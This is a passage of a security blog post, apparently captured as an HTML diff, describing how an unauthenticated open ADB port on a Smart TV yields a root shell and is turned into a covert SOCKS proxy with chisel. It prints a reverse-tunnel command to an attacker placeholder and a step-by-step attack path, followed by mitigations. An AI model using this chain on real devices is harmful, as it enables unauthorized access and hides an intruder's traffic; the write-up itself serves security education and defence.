+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./chisel client &lt;attacker_ip&gt;:&lt;attacker_port&gt; R:&lt;proxy_port&gt;:socks <span class="p">&amp;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>R:</code> prefix tells chisel to expose the SOCKS proxy on the <strong>attacker&rsquo;s</strong> side, even though the connection was initiated from the device. The result is identical: a SOCKS5 proxy on the attacker&rsquo;s localhost, with traffic exiting from the TV. The reverse method is more versatile since it works even when the device can&rsquo;t accept inbound connections, and it is the go-to approach for devices behind restrictive firewalls.</p>
+<h2 id="configuring-the-browser">Configuring the Browser<a hidden class="anchor" aria-hidden="true" href="#configuring-the-browser">#</a></h2>
+<p>I pointed <strong>Firefox</strong> at the SOCKS proxy:<br />
+<img alt="Firefox proxy settings - SOCKS5 through the Smart TV" loading="lazy" src="/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/assets/images/firefox_proxy_config.png"><br /></p>
+<ul>
+<li><strong>SOCKS Host:</strong> <code>127.0.0.1</code></li>
+<li><strong>Port:</strong> <code>1080</code></li>
+<li><strong>SOCKS v5</strong> selected, <strong>Proxy DNS when using SOCKS v5</strong> enabled</li>
+</ul>
+<p>Every HTTP request Firefox makes now travels: <strong>browser -&gt; SOCKS proxy -&gt; chisel tunnel -&gt; Smart TV -&gt; destination</strong>. The destination sees the TV&rsquo;s IP address, not the attacker&rsquo;s.</p>
+<h2 id="the-proof---hidden-behind-the-tv">The Proof - Hidden Behind the TV<a hidden class="anchor" aria-hidden="true" href="#the-proof---hidden-behind-the-tv">#</a></h2>
+<p>To prove the traffic was exiting from the Smart TV, I set up an HTTP server on another host and browsed to it through the proxy:<br />
+<img alt="Proof of concept - destination sees the Smart TV&rsquo;s IP, not the attacker&rsquo;s" loading="lazy" src="/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/assets/images/proxy_poc.png"><br /></p>
+<p>The HTTP server&rsquo;s access log shows two sets of requests. The first came from my real IP address (direct connection). The second came from <strong>the Smart TV&rsquo;s IP address</strong>, not mine.</p>
+<p>The attacker&rsquo;s machine is invisible. The traffic appears to come from a television set that is <em>supposed</em> to be on the network, doing exactly what smart TVs do: making HTTP requests. It blends in perfectly.</p>
+<h2 id="attack-path">Attack Path<a hidden class="anchor" aria-hidden="true" href="#attack-path">#</a></h2>
+<p>The full chain, from an open port to covert network proxy:</p>
+<ol>
+<li>Discover an Android device on the network with <strong>TCP port 5555</strong> open.</li>
+<li>Identify the service as <strong>Android Debug Bridge</strong> via nmap.</li>
+<li><strong><code>adb connect</code></strong> to the device, no authentication required.</li>
+<li><strong><code>adb shell</code></strong> for an interactive root shell.</li>
+<li>Check the device architecture with <code>uname -m</code>.</li>
+<li>Download the matching <a href="https://github.com/jpillora/chisel"><strong>chisel</strong></a> binary and push it to the device via <code>adb push</code>.</li>
+<li>Run chisel as a <strong>SOCKS5 server</strong> on the device (forward mode), or use <strong>reverse mode</strong> if the device can&rsquo;t accept inbound connections.</li>
+<li>Connect the chisel <strong>client</strong> from the attacker&rsquo;s machine.</li>
+<li>Point any application (browser, scanner, tools) at the local SOCKS proxy.</li>
+<li>All traffic now exits from the <strong>Smart TV&rsquo;s IP address</strong>, the attacker is hidden.</li>
+</ol>
+<h2 id="mitigations">Mitigations<a hidden class="anchor" aria-hidden="true" href="#mitigations">#</a></h2>
+<p>An open ADB port is the simplest possible foothold: no exploit, no credentials, just connect. To prevent this:</p>
+<ul>
+<li><strong>Disable ADB over network</strong> on all production/deployed devices. ADB should only be enabled during development, never in a deployed environment.</li>
+<li><strong>Require ADB authorization.</strong> If network ADB must remain on, ensure the device enforces RSA key pairing so that only pre-authorized machines can connect.</li>
+<li><strong>Segment IoT devices onto a dedicated VLAN.</strong> Smart TVs, set-top boxes, and similar devices should not share a network with servers, workstations, or sensitive infrastructure.</li>
+<li><strong>Block port 5555 at the network level.</strong> Firewall rules should prevent any traffic to TCP 5555 from outside the management network.</li>
+<li><strong>Monitor for ADB connections.</strong> An ADB session from an unexpected source is a strong indicator of compromise. Alert on new connections to port 5555.</li>
+<li><strong>Restrict writable directories.</strong> On Android IoT devices, limit which directories allow executable files to be written and run.</li>
+</ul>
+<h3 id="note">Note<a hidden class="anchor" aria-hidden="true" href="#note">#</a></h3>
+<p>The above measures reduce risk significantly but do not guarantee 100% protection - defence in depth is the goal.</p>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>A Smart TV is a computer. It runs a full operating system, has a network stack, and sits on the same network as everything else. When its debug port is left open and unauthenticated, it takes two commands to get root and a few minutes more to turn it into a network proxy. The traffic exits from a device that&rsquo;s <em>supposed</em> to be there, making requests that look like normal IoT behavior.</p>
+<p>Nobody monitors the TV. Nobody patches the TV. Nobody suspects the TV. That&rsquo;s exactly what makes it useful.</p>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
+<ul>
+<li><a href="https://developer.android.com/tools/adb">Android Debug Bridge (ADB) Documentation</a></li>
+<li><a href="https://github.com/jpillora/chisel">chisel - TCP/UDP Tunnel (GitHub)</a></li>
+<li><a href="https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel">Port Forwarding with Chisel (Ben Heater)</a></li>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge">HackTricks - ADB Pentesting</a></li>
+<li><a href="https://owasp.org/www-project-internet-of-things/">OWASP - IoT Attack Surface</a></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://Gill-Singh-A.github.io/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="https://Gill-Singh-A.github.io/tags/hacking/">Hacking</a></li>
+      <li><a href="https://Gill-Singh-A.github.io/tags/infosec/">Infosec</a></li>
+      <li><a href="https://Gill-Singh-A.github.io/tags/adb/">Adb</a></li>
+      <li><a href="https://Gill-Singh-A.github.io/tags/smart-tv/">Smart-Tv</a></li>
+      <li><a href="https://Gill-Singh-A.github.io/tags/chisel/">Chisel</a></li>
+      <li><a href="https://Gill-Singh-A.github.io/tags/pivoting/">Pivoting</a></li>
+      <li><a href="https://Gill-Singh-A.github.io/tags/network-proxy/">Network-Proxy</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://Gill-Singh-A.github.io/p/hiding-behind-a-cctv-turning-a-hikvision-rce-into-a-covert-network-proxy/">
+    <span class="title">Next »</span>
+    <span>Hiding Behind a CCTV - Turning a Hikvision RCE into a Covert Network Proxy</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://Gill-Singh-A.github.io/">Gill.Singh.A</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a><div class="lightbox-overlay" id="lightbox">
+  <button class="lightbox-close" aria-label="Close">&times;</button>
+  <img src="" alt="" />
+</div>
+<script>
+(function() {
+  const overlay = document.getElementById('lightbox');
+  if (!overlay) return;
+  const lbImg = overlay.querySelector('img');
+  const closeBtn = overlay.querySelector('.lightbox-close');
+
+  document.querySelectorAll('.gallery img').forEach(function(img) {
+    img.addEventListener('click', function() {
+      lbImg.src = this.src;
+      lbImg.alt = this.alt;
+      overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    });
+  });
+
+  function closeLightbox() {
+    overlay.classList.remove('active');
+    document.body.style.overflow = '';
+    lbImg.src = '';
+  }
+
+  overlay.addEventListener('click', function(e) {
+    if (e.target !== lbImg) closeLightbox();
+  });
+  closeBtn.addEventListener('click', closeLightbox);
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closeLightbox();
+  });
+})();
+</script>
+
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
